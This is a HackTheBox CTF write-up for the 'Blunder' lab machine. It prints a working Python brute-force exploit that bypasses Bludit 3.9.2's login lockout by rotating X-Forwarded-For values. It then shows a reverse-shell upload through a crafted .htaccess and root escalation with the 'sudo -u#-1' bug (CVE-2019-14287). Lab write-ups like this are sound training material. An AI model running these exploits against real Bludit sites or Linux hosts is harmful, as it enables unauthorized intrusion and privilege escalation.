---
title: "HackTheBox — Blunder Writeup"
date: 2020-10-23 12:20:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, Blunder, ctf, ffuf, masscan, nmap, bludit, bruteforce, bypass, CVE-2019-17240, cewl, Image-upload, RCE, .png, X-Forwarded-For, uuid, htaccess, php, csrf-token, CVE-2019-14287, sudo, -u#-1, bludit-3.9.2]
image: /assets/img/Posts/Blunder.png
---

> Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I'll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I'll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we'll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so.

## Recon

Let's start off with `masscan` and `nmap` to discover open ports and services:

```shell
cfx:  ~/Documents/htb/blunder
→ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.191 --rate 500 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-10-21 16:16:26 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.191

cfx:  ~/Documents/htb/blunder
→ nmap -sC -sV -p80 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 22:36 IST
Nmap scan report for 10.10.10.191
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds
```
Only Port 80 was discovered, From `nmap` output we see HTTP service is running with Apache 2.4.41, and title as **A blunder of interesting facts**.

### Port 80 - HTTP

#### Blog

On the first look it seems it's displaying some kind of blog.

![website](/assets/img/Posts/Blunder/website.png)

Except three posts from the author and an about page, we don't find anything interesting. Apart from that I saw the webpage running PHP on my **Wappalyzer** extension.

#### Web Fuzzing

We'll use `ffuf` to fuzz website for hidden directories and files, I'll also include extension check for `.php & .txt` files.

```shell
cfx:  ~/Documents/htb/blunder
→ ffuf -c -r -u http://10.10.10.191/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .php,.txt -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Extensions       : .php .txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 200, Size: 2385, Words: 106, Lines: 71]
install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
usb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]
:: Progress: [60348/60348] :: Job [1/1] :: 84 req/sec :: Duration: [0:11:50] :: Errors: 0 ::
```

### Admin

Visiting <http://10.10.10.191/admin> leads us to `/admin/` login page for [**Bludit**](https://www.bludit.com/):

> Bludit is a web application to build your own website or blog in seconds, it's completely free and open source. Bludit uses files in JSON format to store the content, you don't need to install or configure a database. You only need a web server with PHP support.

![login](/assets/img/Posts/Blunder/login.png)

### install.php

<http://10.10.10.191/install.php> says Bludit is already installed.

```shell
cfx:  ~/Documents/htb/blunder
→ curl http://10.10.10.191/install.php
Bludit is already installed ;)
```

### todo.txt

```shell
cfx:  ~/Documents/htb/blunder
→ curl http://10.10.10.191/todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Two important things to note from this `todo.txt` :
- CMS has not been updated, a hint to check on Bludit CMS vulnerabilities.
- Inform fergus, seems we have a potential username `fergus`

## Bludit Vulnerabilities

```shell
cfx:  ~/Documents/htb/blunder
→ searchsploit bludit
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Bludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Although `Metasploit` exploit looks promising, Rather than auto exploiting using Metasploit, lets do it manually. Also we still are not sure whether these are applicable to us since we don't know the version of Bludit.

### Version Hunt

While trying ``admin:admin` credential on login page, inside the network section of Inspect element I noticed some CSS & JS files are loading, all of them showcasing some version 3.9.2.

![network](/assets/img/Posts/Blunder/network.png)

On [**searching**](https://github.com/bludit/bludit/search?q=bootstrap.min.css%3Fversion) for `bootstrap.min.css?verion` inside bludit repository, we understand it's the Bludit Version that is being disclosed.

![version](/assets/img/Posts/Blunder/version.png)

Great, so we are running `Bludit Version : 3.9.2`

### Research

A good approach is to always look at **Github issues** while hunting for vulnerabilities.

Some quick google search on **Bludit cms issues** leads us to <https://github.com/bludit/bludit/issues/1081> describing Bludit 3.9.2 has a vulnerability in Image upload functionality leading to Remote Code Execution, but it requires authentication.

## Brute-forcing Creds

I found a [**post by Rastating**](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) explaining a vulnerability on Bludit CMS where Bludit version 3.9.2 and prior are vulnerable to bypass a anti-brute force mechanism which tracks the User's IP. This brute force mechanism blocks the user's IP which has attempted to incorrectly login 10 times or more.

It takes the IP from `X-Forwarded-For` header, sole reason behind trusting this header is to determine the IP address of end users who are accessing the website behind a proxy, which avoids banning all members with same IP address behind a proxy. However, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.

As the end user can control it, if we can change it on every login attempt with some random value, we are good to brute force the login page for valid credentials.

### Prerequisites

Since we already have a username `fergus` from todo.txt, we'll use the same to brute force.

#### Wordlist

Rather than jumping to `rockyou.txt`, we can first try a wordlist generated from the website itself, Using `cewl` we can generate a custom wordlist from the site and name it as `pass.txt`

```shell
cfx:  ~/Documents/htb/blunder
→ cewl http://10.10.10.191 > pass.txt
```
I'll the remove cewl banner from the list which leaves us with 349 words.

### Exploit.py

Rastating has already given a POC script, but the vanilla version of the script can't be used to brute-force in this case.

With reference to the original script, I created a exploit of my own which can be found [**here**](https://github.com/ColdFusionX/CVE-2019-17240-Exploit-Bludit-BF-bypass) where I have showcased the exploit usage in detail.

The exploit takes three user inputs `login url, user.txt and pass.txt` where user.txt contains the potential list of usernames to be used in brute force (fergus in our case), pass.txt is the dictionary of passwords. For `X-Forwarded-For` header the scripts inputs values from the pass.txt and also tells if any word gets blocked during brute force by the site.

#### Exploit Code

```python
#Author: ColdFusionX (Mayank Deshmukh)

import requests
import sys
import re
import argparse, textwrap
from pwn import *

#Expected Arguments
parser = argparse.ArgumentParser(description="Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass", formatter_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''))

parser.add_argument("-l","--url", help="Path to Bludit (Example: http://127.0.0.1/admin/login.php)")
parser.add_argument("-u","--userlist", help="Username Dictionary")
parser.add_argument("-p","--passlist", help="Password Dictionary")
args = parser.parse_args()

if len(sys.argv) < 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")
    sys.exit(1)

# Variable
LoginPage = args.url
Username_list = args.userlist
Password_list = args.passlist

log.info('Bludit Auth BF Mitigation Bypass Script by ColdFusionX \n ')

def login(Username,Password):
    session = requests.session()
    r = session.get(LoginPage)

# Progress Check
    process = log.progress('Brute Force')

#Getting CSRF token value
    CSRF = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)
    CSRF = CSRF.group(1)

#Specifying Headers Value
    headerscontent = {
    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Referer' : f"{LoginPage}",
    'X-Forwarded-For' : f"{Password}"
    }

#POST REQ data
    postreqcontent = {
    'tokenCSRF' : f"{CSRF}",
    'username' : f"{Username}",
    'password' : f"{Password}"
    }

#Sending POST REQ
    r = session.post(LoginPage, data = postreqcontent, headers = headerscontent, allow_redirects= False)

#Printing Username:Password
    process.status('Testing -> {U}:{P}'.format(U = Username, P = Password))

#Conditional loops
    if 'Location' in r.headers:
        if "/admin/dashboard" in r.headers['Location']:
            print()
            log.info(f'SUCCESS !!')
            log.success(f"Use Credential -> {Username}:{Password}")
            sys.exit(0)
    elif "has been blocked" in r.text:
        log.failure(f"{Password} - Word BLOCKED")

#Reading User.txt & Pass.txt files
userfile = open(Username_list).readlines()
for Username in userfile:
    Username = Username.strip()

passfile = open(Password_list).readlines()
for Password in passfile:
    Password = Password.strip()
    login(Username,Password)
```

#### Usage

```shell
cfx:  ~/Documents/htb/blunder
→ ./exploit.py -h
usage: exploit.py [-h] [-l URL] [-u USERLIST] [-p PASSLIST]

Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass

optional arguments:
  -h, --help            show this help message and exit
  -l URL, --url URL     Path to Bludit (Example: http://127.0.0.1/admin/login.php)
  -u USERLIST, --userlist USERLIST
                        Username Dictionary
  -p PASSLIST, --passlist PASSLIST
                        Password Dictionary

Exploit Usage :
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt
```
On running the exploit with proper arguments, it will display each attempting login credential and on successful login will display the credential to use.

```shell
cfx:  ~/Documents/htb/blunder
→ ./exploit.py -l http://10.10.10.191/admin/ -u user.txt -p pass.txt
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX

[┘] Brute Force: Testing -> fergus:the
[<] Brute Force: Testing -> fergus:Load
[▘] Brute Force: Testing -> fergus:Plugins
[.] Brute Force: Testing -> fergus:Site
[◓] Brute Force: Testing -> fergus:Page

[..SNIP..]

[◓] Brute Force: Testing -> fergus:fictional
[.] Brute Force: Testing -> fergus:character
[|] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```

Great ! We have a username and password to login `fergus:RolandDeschain`

## Shell as www-data

Using `fergus:RolandDeschain` we can login successfully.

### PHP Shell - Image Upload

Now that we are authenticated we can replicate the **Code Execution** vulnerability steps mentioned on [**Github issue 1081**](https://github.com/bludit/bludit/issues/1081) and get ourselves a reverse shell on the box.

#### Overview

Based on the vulnerability explained on Github, When a PHP file is uploaded, it is first stored inside the temporary location `http://10.10.10.191/bl-content/tmp/` , If the extension check is successful it will store the file to the dedicated directory, but if it fails the file sits idle inside the `/tmp` folder. But, even though the php file is uploaded on the server, it wont work since `.htaccess` file from root directory denies direct access to next directories.

```shell
# Deny direct access to the next directories
RewriteRule ^bl-content/(databases|workspaces|pages|tmp)/.*$ - [R=404,L]
```
Instead, what we can do is upload our own `.htaccess` file on the server inside which resides inside `/tmp/` directory, which is the same directory that allows us to execute our code. This crafted `.htaccess` will turn off Rewrite Engine on the site and tell the server to execute .png file as .php.

#### Attack Scenario

1. Take a PHP reverse shell, change it's extension to `.png`.
2. Upload it to the server and change the `uuid` value to `../../tmp/cfx` which stores the .png file inside `/bl-content/tmp/cfx` folder.
3. Create a `.htaccess` file which says the server to execute .png as .php
4. Change it's extension to `htaccess.png` and again rename it to `.htaccess` while intercepting the request.
5. We'll get the error as `File type not supported` but `.htaccess` file will get uploaded inside `/bl-content/tmp/` which allows us to run .png file as .php.

### Exploitation

#### PHP Shell upload

PHP reverse shell can be found inside `/usr/share/webshell/php/` or `/usr/share/laudanum/php/`, same can also be downloaded from [**pentestmonkey**](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) for Non-Kali users.

```shell
cfx:  ~/Documents/htb/blunder
→ mv php-reverse-shell.php shell.png
```
On selecting New content > Image we have the following screen:

![upload](/assets/img/Posts/Blunder/upload.png)

Next, we upload and intercept our request on `burp`:

![burp1](/assets/img/Posts/Blunder/burp1.png)

At the bottom, we change the `uuid` value as `../../tmp/cfx`, this will create a directory named `cfx` inside `tmp` and upload `shell.png` inside it.

![burp2](/assets/img/Posts/Blunder/burp2.png)

On successfull upload, we shall see `"message":"Images uploaded."` on response.

##### .htaccess upload

Now that our `shell.png` is uploaded on the box, we need to access and trigger it.

We'll create a `htacces file` with following content and change it's extension to `.png`

```shell
cfx:  ~/Documents/htb/blunder
→ cat htaccess.png
RewriteEngine off
AddType application/x-httpd-php .png
```
Intercepting the request, changing the file name back to `.htaccess` and forwarding the request:

![htaccess](/assets/img/Posts/Blunder/htaccess.png)

We get the error as `message":"File type is not supported` on response. But it's fine, our file will still be available to `/bl-content/tmp` directory.

#### Files

Visiting <http://10.10.10.191/bl-content/tmp/cfx/> we see our shell.png :

![shell](/assets/img/Posts/Blunder/shell.png)


### Reverse Shell

On triggering `shell.png` we get a call back on our `pwncat` listener:

```shell
cfx:  ~/Documents/htb/blunder
→ pwncat -l 8020 -vv
INFO: Listening on :::8020 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8020 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.191:54436 (family 2/IPv4, TCP)
Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:07:44 up  2:03,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shaun    :0       :0               17:04   ?xdm?   1:29   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@blunder:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Elevating Priv: www-data -> hugo

I found `user.txt` inside folder of user `hugo` and was readable by hugo only.

Heading to `/var/www/`, I searched for anything related to user hugo and found a database config file with some hash in it.

```shell
www-data@blunder:/var/www$ find * | grep -ir hugo
bludit-3.10.0a/bl-content/databases/users.php:        "nickname": "Hugo",
bludit-3.10.0a/bl-content/databases/users.php:        "firstName": "Hugo",
find: 'standard output': Broken pipe
find: write error
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
In todo.txt, we saw a note saying remove old users. Seems Admin decided to update the CMS but forgot to remove old config files.

Using [**Crackstation**](https://crackstation.net/) we have the cracked hash as `Password120`

### SU - hugo

Using `Password120` we can `su` to user hugo:

```shell
www-data@blunder:/var/www$ su hugo -
su hugo -
Password: Password120
hugo@blunder:/var/www$
```
#### Grabbing user.txt

```shell
hugo@blunder:~$ cat user.txt
cat user.txt
6633fe5a84ee57d*****************

```
## Elevating Priv: hugo -> root

### Enumeration

Checking if our user has any special privileges using `sudo -l` results something very interesting:

```shell
hugo@blunder:/var/www$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
It means user Hugo can run `/bin/bash` as any user except root, Let's test it out:

```shell
hugo@blunder:~$ sudo -u shaun /bin/bash
sudo -u shaun /bin/bash
Password: Password120

shaun@blunder:/home/hugo$ exit

hugo@blunder:~$ sudo -u root /bin/bash
sudo -u root /bin/bash
Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
```
### CVE-2019-14287

Last year in 2019, a sudo vulnerability was discovered which allowed a user to execute command as root even if the user was disallowed to do so.

> The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access.

Sudo version prior to 1.8.28 are impacted by this vulnerability.

On checking the `sudo` version of our machine, We can see the version is `1.8.25` which should be vulnerable:

```shell
hugo@blunder:/var/www$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
### Shell as root

I found this [**PoC**](https://www.exploit-db.com/exploits/47502) for exploiting this vuln, using `-u <shaun>` with sudo we can say which user to run as. We can also do the same using `-u#<uid>` with uid of user.

If we specify 0 as uid which is basically the uid for root, it returns the user can't run command as root. But as per PoC, if we specify `uid as -1` it will run the command as root.

```shell
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# whoami
whoami
root
```
Bingo ! It worked.

#### Grabbing root.txt
```shell
root@blunder:/root# cat root.txt
cat root.txt
ef1d3e631dbca18*****************

```
And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
